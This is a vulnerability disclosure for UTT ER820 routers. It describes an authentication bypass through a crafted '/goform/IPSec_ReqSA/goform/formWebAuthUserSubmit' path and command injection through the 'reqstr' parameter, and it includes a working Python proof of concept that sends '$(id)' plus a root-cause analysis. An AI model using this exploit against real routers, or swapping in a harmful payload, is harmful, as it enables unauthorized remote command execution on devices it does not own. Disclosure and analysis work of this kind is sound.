# CVE Report - Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers

## Vulnerability Title

Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers (IPSec_ReqSA / sub_474184)

## Vulnerability Description

UTT ER820 devices expose the GoAhead `websFormHandler` endpoint `IPSec_ReqSA` (mapped to function `sub_474184`, ranges `0x4741c8-0x4742c0` / `0x4741c8-0x4742dc` / `0x4741c8-0x474314`) which can be reached via an authentication bypass, and then abused for command injection. Remote attackers can inject shell commands via the POST parameter `reqstr`, which is inserted into `doSystem()` calls that invoke `ipsec`.

## POC

```py
import requests
import sys

def exploit(base_url: str):
    url = base_url.rstrip('/') + '/goform/IPSec_ReqSA/goform/formWebAuthUserSubmit'
    data = {
        'reqstr': '$(id)',
    }
    requests.post(url, data=data, timeout=5)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('usage: python poc.py http://target')
        raise SystemExit(1)
    exploit(sys.argv[1])
    print('sent')
```

## Cause Analysis

1. **authentication**: In `websSecurityHandler`, requests whose URL contains `/goform/formWebAuthUserSubmit` or `/goform/formWebAuthOk` are routed directly to `websFormHandler`. A crafted path like `/goform/IPSec_ReqSA/goform/formWebAuthUserSubmit` can therefore bypass authentication to reach `IPSec_ReqSA`.

2. **command injection**: In `sub_474184`, the request parameter `reqstr` is retrieved via `websGetVar` and tokenized (split by `:`). Each token `i` is then embedded into shell commands such as `doSystem("ipsec auto --down \"%s\"", i)` and `doSystem("ipsec auto --up \"%s\" &", i)`. Because the value is passed through a shell (via `doSystem/system`) and not safely escaped, command substitution like `$()` can execute arbitrary commands.
